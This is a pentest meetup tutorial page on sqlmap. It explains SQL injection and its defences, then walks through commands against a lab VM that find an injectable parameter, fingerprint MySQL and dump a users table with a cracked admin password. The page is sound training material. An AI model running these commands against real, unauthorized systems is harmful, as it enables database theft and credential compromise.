@@ -1,0 +1,498 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>6.14. sqlmap &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="6. Pentest Network Tools" href="../pentest_network_tools.html"/>
+        <link rel="next" title="6.15. tcpdump &amp; tcpflow" href="tcpdump_tcpflow.html"/>
+        <link rel="prev" title="6.13. socat vs (nc vs ncat vs netcat)" href="socat.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="aircrack-ng.html">6.1. aircrack-ng</a></li>
+<li class="toctree-l2"><a class="reference internal" href="beef.html">6.2. BeEF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="burp_suite.html">6.3. Burp Suite and ZAP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="curl.html">6.4. curl</a></li>
+<li class="toctree-l2"><a class="reference internal" href="drive_droid_kon-boot.html">6.5. DriveDroid &amp; Kon-Boot</a></li>
+<li class="toctree-l2"><a class="reference internal" href="mana.html">6.6. mana</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nmap.html">6.7. nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="openvas.html">6.8. OpenVAS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pcredz.html">6.9. Pcredz pcap credentials</a></li>
+<li class="toctree-l2"><a class="reference internal" href="hak5_pineapple.html">6.10. Hak5 Pineapple</a></li>
+<li class="toctree-l2"><a class="reference internal" href="proxychains.html">6.11. Proxy Chains</a></li>
+<li class="toctree-l2"><a class="reference internal" href="responder.html">6.12. Responder</a></li>
+<li class="toctree-l2"><a class="reference internal" href="socat.html">6.13. <code class="docutils literal"><span class="pre">socat</span></code> vs (<code class="docutils literal"><span class="pre">nc</span></code> vs <code class="docutils literal"><span class="pre">ncat</span></code> vs <code class="docutils literal"><span class="pre">netcat</span></code>)</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">6.14. sqlmap</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#sql-injection">6.14.1. SQL injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sqlmap-intro">6.14.2. sqlmap intro</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sqlmap-examples">6.14.3. sqlmap examples</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#general-miscellaneous">6.14.3.1. General &amp; Miscellaneous</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#enumeration-fingerprint">6.14.3.2. Enumeration &amp; Fingerprint</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#request">6.14.3.3. Request</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="tcpdump_tcpflow.html">6.15. tcpdump &amp; tcpflow</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tunneling_traffic.html">6.16. Tunneling Traffic</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webgoat.html">6.17. Web Goat</a></li>
+<li class="toctree-l2"><a class="reference internal" href="wireshark.html">6.18. Wireshark</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xsscrapy.html">6.19. xsscrapy</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_network_tools.html">6. Pentest Network Tools</a> &raquo;</li>
+        
+      <li>6.14. sqlmap</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/network_tools/sqlmap.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="id1">
+<h1>6.14. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="sql-injection">
+<h2>6.14.1. SQL injection<a class="headerlink" href="#sql-injection" title="Permalink to this headline">¶</a></h2>
+<p>From <a class="reference external" href="https://en.wikipedia.org/wiki/SQL_injection">Wikipedia SQL injection</a>:</p>
+<blockquote>
+<div>SQL injection is a code injection technique, used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).[1] SQL injection must exploit a security vulnerability in an application’s software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.</div></blockquote>
+<p>See <a class="reference external" href="http://bobby-tables.com/">Bobby Tables: A guide to preventing SQL injection</a>. To secure a database against SQL injection you should use only prepared SQL statements, turn off DBMS error reports, and use the least privileged account. Do not use your own custom code as these are subject to mistakes.</p>
+</div>
+<div class="section" id="sqlmap-intro">
+<h2>6.14.2. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> intro<a class="headerlink" href="#sqlmap-intro" title="Permalink to this headline">¶</a></h2>
+<p><code class="docutils literal"><span class="pre">sqlmap</span></code> is a Python program supporting both SQL injection and direct database connection. <code class="docutils literal"><span class="pre">sqlmap</span></code> can exploit a database and interact with the file and operating systems. Exploiting a database can include reading data (including passwords), determining database structure, modifying the database including stored procedures, and replicating a local copy of the data. Interacting with the file system can include uploading, downloading, and modifying files. Interacting with the operating systems can include running arbitratry commands. The functionality is highly dependent on the DBMS involved.</p>
+<p>Consult the <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki">sqlmap wiki</a> for an introduction. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Techniques">sqlmap techniques</a> summarizes the 5 different SQL injection types supported by <code class="docutils literal"><span class="pre">sqlmap</span></code>. Note that the structure of the database application determines the possible injection types. For example, the <em>UNION query-based</em> type works for “the output of the <code class="docutils literal"><span class="pre">SELECT</span></code> statement within a <code class="docutils literal"><span class="pre">for</span></code> loop, or similar, …”.</p>
+<p>From <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki">sqlmap wiki features</a>:</p>
+<blockquote>
+<div><p><code class="docutils literal"><span class="pre">sqlmap</span></code> “generic features” describes much of what you expect from SQL injection. It has “Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MaxDB database management systems.” It not only supports SQL injection but also direct connection to the database. And it can “replicate the back-end database tables structure and entries on a local SQLite 3 database.”</p>
+<p><code class="docutils literal"><span class="pre">sqlmap</span></code> “fingerprint and enumeration features” not only can fingerprint the database and operating systems, but also determine the database structure.</p>
+<p><code class="docutils literal"><span class="pre">sqlmap</span></code> “takeover features” can download/upload files, execute arbitrary commands and retrieve their output, and in-memory execution of Metasploit shellcode. These are available in some versions of MySQL, PostgreSQL, and Microsoft SQL Server.</p>
+</div></blockquote>
+</div>
+<div class="section" id="sqlmap-examples">
+<h2>6.14.3. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> examples<a class="headerlink" href="#sqlmap-examples" title="Permalink to this headline">¶</a></h2>
+<p>One way to study <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> is to run <code class="docutils literal"><span class="pre">sqlmap</span> <span class="pre">--help</span></code> and study arguments by group. We’ll do that here using as a target the VM in <a class="reference internal" href="../challenges/from_sql_injection_to_shell.html#pentesterlabsqli2shell"><span class="std std-ref">PentesterLab From SQL injection to Shell</span></a>.</p>
+<div class="section" id="general-miscellaneous">
+<h3>6.14.3.1. General &amp; Miscellaneous<a class="headerlink" href="#general-miscellaneous" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="use-output-dir-pwd-sqlmap">
+<h4>6.14.3.1.1. use <code class="docutils literal"><span class="pre">--output-dir</span> <span class="pre">$PWD/sqlmap</span></code><a class="headerlink" href="#use-output-dir-pwd-sqlmap" title="Permalink to this headline">¶</a></h4>
+<p>The preferred way to use <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> is to explicitly specify the output directory as a fully qualified path, usually based on $PWD: <code class="docutils literal"><span class="pre">sqlmap</span> <span class="pre">--output-dir</span> <span class="pre">$PWD/sqlmap</span></code>.</p>
+<p>Different <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> versions run via <code class="docutils literal"><span class="pre">sudo</span></code> have defaulted to <em>/root/.sqlmap/output/</em> or <em>/usr/share/sqlmap/output/</em>, and otherwise either <em>~/.sqlmap/output/</em> or <em>/tmp/sqlmapoutput??????</em> (?????? a random 6 digit string). The <em>/tmp/sqlmapoutput??????</em> is especially bad as <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> saves results that can be re-used, so choosing a different subdirectory of <em>/tmp/</em> for each <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> run forces recomputation of these results. So avoid all this and just specify <code class="docutils literal"><span class="pre">--output-dir</span> <span class="pre">$PWD/sqlmap</span></code>.</p>
+<p>To clean up the default directory locations run <code class="docutils literal"><span class="pre">sqlmap</span> <span class="pre">--purge-output</span></code> and <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">sqlmap</span> <span class="pre">--purge-output</span></code>. This is especially important when running multiple pentest challenges having the same target IP:</p>
+</div>
+<div class="section" id="use-batch-and-answers-answers-to-override">
+<h4>6.14.3.1.2. use <code class="docutils literal"><span class="pre">--batch</span></code> and <code class="docutils literal"><span class="pre">--answers=ANSWERS</span></code> to override<a class="headerlink" href="#use-batch-and-answers-answers-to-override" title="Permalink to this headline">¶</a></h4>
+<p><a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> runtime questions can be answered automatically via <code class="docutils literal"><span class="pre">--batch</span></code> (takes the default answers), follwed by <code class="docutils literal"><span class="pre">--answers=ANSWERS</span></code> to override selected default answers. Choose a unique word or phrase for each question and be wary of choosing something that appears in several questions as it will match all those questions. Consider the following three questions:</p>
+<ul class="simple">
+<li>custom injection marking character (‘*’) found in option ‘–headers/–user-agent/–referer/–cookie’. Do you want to process it? [Y/n/q] Y</li>
+<li>(custom) HEADER parameter ‘X-Forwarded-For #1*’ is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</li>
+<li>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option ‘–time-sec’)? [Y/n] Y</li>
+</ul>
+<p>Suppose you want all defaults except the last question; choosing <code class="docutils literal"><span class="pre">--batch</span> <span class="pre">--answers=&quot;want=N&quot;</span></code> will actually answer “N” to all three questions because “want” appears in all three questions. Instead, choosing <code class="docutils literal"><span class="pre">--batch</span> <span class="pre">--answers=&quot;optimize=N&quot;</span></code> will override only the last question, as desired.</p>
+</div>
+<div class="section" id="forms-with-crawl-crawldepth">
+<span id="sqlmap-forms-crawl"></span><h4>6.14.3.1.3. <code class="docutils literal"><span class="pre">--forms</span></code> with <code class="docutils literal"><span class="pre">crawl=CRAWLDEPTH</span></code><a class="headerlink" href="#forms-with-crawl-crawldepth" title="Permalink to this headline">¶</a></h4>
+<p>You don’t have to manually search all pages for SQL injectable forms when <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> will do it for you.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="gp">hacker@kali:~$</span> rm -rf sqlmap/
+<span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --forms --crawl<span class="o">=</span><span class="m">2</span>  --dbs <span class="se">\</span>
+    --batch --output <span class="nv">$PWD</span>/sqlmap
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">[12:21:16] [INFO] starting crawler</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">[12:21:16] [INFO] sqlmap got a total of 7 targets</span>
+<span class="go">[#1] form:</span>
+<span class="go">POST http://192.168.1.104:80/admin/index.php</span>
+<span class="go">POST data: user=&amp;password=</span>
+<span class="go">do you want to test this form? [Y/n/q]</span>
+<span class="gp">&gt;</span> Y
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">[#2] form:</span>
+<span class="go">GET http://192.168.1.104:80/cat.php?id=1</span>
+<span class="go">do you want to test this form? [Y/n/q]</span>
+<span class="gp">&gt;</span> Y
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">do you want to exploit this SQL injection? [Y/n] Y</span>
+<span class="go">[12:21:47] [INFO] the back-end DBMS is MySQL</span>
+<span class="go">web server operating system: Linux Debian 6.0 (squeeze)</span>
+<span class="go">web application technology: PHP 5.3.3, Apache 2.2.16</span>
+<span class="go">back-end DBMS: MySQL 5.0</span>
+<span class="go">[12:21:47] [INFO] fetching database names</span>
+<span class="go">available databases [2]:</span>
+<span class="go">[*] information_schema</span>
+<span class="go">[*] photoblog</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="enumeration-fingerprint">
+<h3>6.14.3.2. Enumeration &amp; Fingerprint<a class="headerlink" href="#enumeration-fingerprint" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="use-banner-and-fingerprint">
+<h4>6.14.3.2.1. use <code class="docutils literal"><span class="pre">--banner</span></code> and <code class="docutils literal"><span class="pre">--fingerprint</span></code><a class="headerlink" href="#use-banner-and-fingerprint" title="Permalink to this headline">¶</a></h4>
+<p>To get basic service information use <code class="docutils literal"><span class="pre">--banner</span></code> and <code class="docutils literal"><span class="pre">--fingerprint</span></code>:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="gp">hacker@kali:~$</span> rm -rf sqlmap/
+<span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span>  --fingerprint --banner <span class="se">\</span>
+    --batch --output <span class="nv">$PWD</span>/sqlmap
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">[12:54:07] [INFO] fetching banner</span>
+<span class="go">[12:54:07] [INFO] actively fingerprinting MySQL</span>
+<span class="go">[12:54:07] [INFO] executing MySQL comment injection fingerprint</span>
+<span class="go">web server operating system: Linux Debian 6.0 (squeeze)</span>
+<span class="go">web application technology: PHP 5.3.3, Apache 2.2.16</span>
+<span class="go">back-end DBMS: active fingerprint: MySQL &gt;= 5.1.12 and &lt; 5.5.0</span>
+<span class="go">               banner parsing fingerprint: MySQL 5.1.63</span>
+<span class="go">               html error message fingerprint: MySQL</span>
+<span class="go">banner:    &#39;5.1.63-0+squeeze1&#39;</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="use-dbs-d-database-tables-d-database-t-table-dump">
+<h4>6.14.3.2.2. use <code class="docutils literal"><span class="pre">--dbs</span></code>, <code class="docutils literal"><span class="pre">-D</span> <span class="pre">DATABASE</span> <span class="pre">--tables</span></code>, <code class="docutils literal"><span class="pre">-D</span> <span class="pre">DATABASE</span> <span class="pre">-T</span> <span class="pre">TABLE</span> <span class="pre">--dump</span></code><a class="headerlink" href="#use-dbs-d-database-tables-d-database-t-table-dump" title="Permalink to this headline">¶</a></h4>
+<p>Once you figure out the dbms, you can move through <code class="docutils literal"><span class="pre">-dbs</span></code> to enumerate databases, <code class="docutils literal"><span class="pre">-D</span> <span class="pre">DATABASE</span> <span class="pre">--tables</span></code> to enumerate tables in the database, and finally <code class="docutils literal"><span class="pre">-D</span> <span class="pre">DATABASE</span> <span class="pre">-T</span> <span class="pre">TABLE</span> <span class="pre">--dump</span></code> to dump the selected table. Here it goes one step forward and cracks a password in the dumped table:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span>  <span class="se">\</span>
+    --fingerprint -D photoblog -T users --dump  --batch --output <span class="nv">$PWD</span>/sqlmap
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">Database: photoblog</span>
+<span class="go">Table: users</span>
+<span class="go">[1 entry]</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+<span class="go">| id | login | password                                    |</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+<span class="go">| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="level-risk-and-p-skip-control-injection-points">
+<h4>6.14.3.2.3. <code class="docutils literal"><span class="pre">--level</span></code>, <code class="docutils literal"><span class="pre">--risk</span></code> and <code class="docutils literal"><span class="pre">-p</span></code>, <code class="docutils literal"><span class="pre">--skip</span></code> control injection points<a class="headerlink" href="#level-risk-and-p-skip-control-injection-points" title="Permalink to this headline">¶</a></h4>
+<p>From <code class="docutils literal"><span class="pre">sqlmap</span> <span class="pre">--help</span></code>:</p>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group">
+<kbd><span class="option">--level=<var>LEVEL</var></span></kbd></td>
+<td>Level of tests to perform (1-5, default 1)</td></tr>
+<tr><td class="option-group">
+<kbd><span class="option">--risk=<var>RISK</var></span></kbd></td>
+<td>Risk of tests to perform (0-3, default 1)</td></tr>
+</tbody>
+</table>
+</div></blockquote>
+<p>The actual tests performed are in the file <em>xml/payloads.xml</em>, a difficult to read and understand file (to say the least). Informally, <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap usage</a> states:</p>
+<blockquote>
+<div><p>By default sqlmap tests all GET parameters and POST parameters. When the value of –level is &gt;= 2 it tests also HTTP Cookie header values. When this value is &gt;= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections. It is however possible to manually specify a comma-separated list of parameter(s) that you want sqlmap to test. This will bypass the dependence on value of –level too.</p>
+<p>For instance, to test for GET parameter id and for HTTP User-Agent only, provide -p “id,user-agent”.</p>
+<p>In case that user wants to exclude certain parameters from testing, he can use option –skip. That is especially useful in cases when you want to use higher value for –level and test all available parameters excluding some of HTTP headers normally being tested.</p>
+<p>For instance, to skip testing for HTTP header User-Agent and HTTP header Referer at –level=5, provide –skip=”user-agent,referer”.</p>
+</div></blockquote>
+<p>And for risk it states:</p>
+<blockquote>
+<div><p>This option requires an argument which specifies the risk of tests to perform. There are four risk values. The default value is 1 which is innocuous for the majority of SQL injection points. Risk value 2 adds to the default level the tests for heavy query time-based SQL injections and value 3 adds also OR-based SQL injection tests.</p>
+<p>In some instances, like a SQL injection in an UPDATE statement, injecting an OR-based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants. For this reason and others this option has been introduced: the user has control over which payloads get tested, the user can arbitrarily choose to use also potentially dangerous ones. As per the previous option, the payloads used by sqlmap are specified in the textual file xml/payloads.xml and you are free to edit and add your owns.</p>
+</div></blockquote>
+</div>
+</div>
+<div class="section" id="request">
+<h3>6.14.3.3. Request<a class="headerlink" href="#request" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="http-get-vs-post">
+<h4>6.14.3.3.1. HTTP GET vs POST<a class="headerlink" href="#http-get-vs-post" title="Permalink to this headline">¶</a></h4>
+<p>Injection points are often in either GET or POST forms and <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> handles both. All <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> runs must specify a url using one of the following (but usually <code class="docutils literal"><span class="pre">-u</span></code> or <code class="docutils literal"><span class="pre">-url</span></code>):</p>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group">
+<kbd><span class="option">-d <var>DIRECT</var></span></kbd></td>
+<td>Direct connection to the database</td></tr>
+<tr><td class="option-group" colspan="2">
+<kbd><span class="option">-u <var>URL</var></span>, <span class="option">--url=<var>URL</var></span></kbd></td>
+</tr>
+<tr><td>&#160;</td><td>Target URL (e.g. “www.target.com/vuln.php?id=1”)</td></tr>
+<tr><td class="option-group">
+<kbd><span class="option">-l <var>LOGFILE</var></span></kbd></td>
+<td>Parse targets from Burp or WebScarab proxy logs</td></tr>
+<tr><td class="option-group">
+<kbd><span class="option">-m <var>BULKFILE</var></span></kbd></td>
+<td>Scan multiple targets enlisted in a given textual file</td></tr>
+<tr><td class="option-group">
+<kbd><span class="option">-r <var>REQUESTFILE</var></span></kbd></td>
+<td>Load HTTP request from a file</td></tr>
+<tr><td class="option-group">
+<kbd><span class="option">-g <var>GOOGLEDORK</var></span></kbd></td>
+<td>Process Google dork results as target URLs</td></tr>
+<tr><td class="option-group">
+<kbd><span class="option">-c <var>CONFIGFILE</var></span></kbd></td>
+<td>Load options from a configuration INI file</td></tr>
+</tbody>
+</table>
+</div></blockquote>
+<p>POST requests additionally use the <code class="docutils literal"><span class="pre">--data</span></code> option to specify POST parameters.</p>
+<blockquote>
+<div><table class="docutils option-list" frame="void" rules="none">
+<col class="option" />
+<col class="description" />
+<tbody valign="top">
+<tr><td class="option-group">
+<kbd><span class="option">--data=<var>DATA</var></span></kbd></td>
+<td>Data string to be sent through POST</td></tr>
+<tr><td class="option-group" colspan="2">
+<kbd><span class="option">--param-del=<var>PDEL</var></span></kbd></td>
+</tr>
+<tr><td>&#160;</td><td>Character used for splitting parameter values</td></tr>
+</tbody>
+</table>
+</div></blockquote>
+<p>Here is are examples of a GET and POST requests. Note that you can avoid using <code class="docutils literal"><span class="pre">--data</span></code> by using the <code class="docutils literal"><span class="pre">-forms</span></code> option to automatically parse the form data (see <a class="reference internal" href="#sqlmap-forms-crawl"><span class="std std-ref">--forms with crawl=CRAWLDEPTH</span></a>).</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># GET</span>
+python sqlmap.py -u <span class="s2">&quot;http://www.target.com/vuln.php?id=1&quot;</span> -f <span class="se">\</span>
+    --banner --dbs --users
+<span class="c1"># POST</span>
+python sqlmap.py -u <span class="s2">&quot;http://www.target.com/vuln.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;id=1&quot;</span> -f <span class="se">\</span>
+    --banner --dbs --users
+<span class="c1"># POST with --param-del to avoid ampersand character</span>
+python sqlmap.py -u <span class="s2">&quot;http://www.target.com/vuln.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;query=foobar;id=1&quot;</span> <span class="se">\</span>
+    --param-del<span class="o">=</span><span class="s2">&quot;;&quot;</span> -f --banner --dbs --users
+<span class="c1"># POST using --forms</span>
+python sqlmap.py -u <span class="s2">&quot;http://www.target.com/vuln.php&quot;</span> --forms -f --banner <span class="se">\</span>
+    --dbs --users
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="tcpdump_tcpflow.html" class="btn btn-neutral float-right" title="6.15. tcpdump &amp; tcpflow" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="socat.html" class="btn btn-neutral" title="6.13. socat vs (nc vs ncat vs netcat)" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
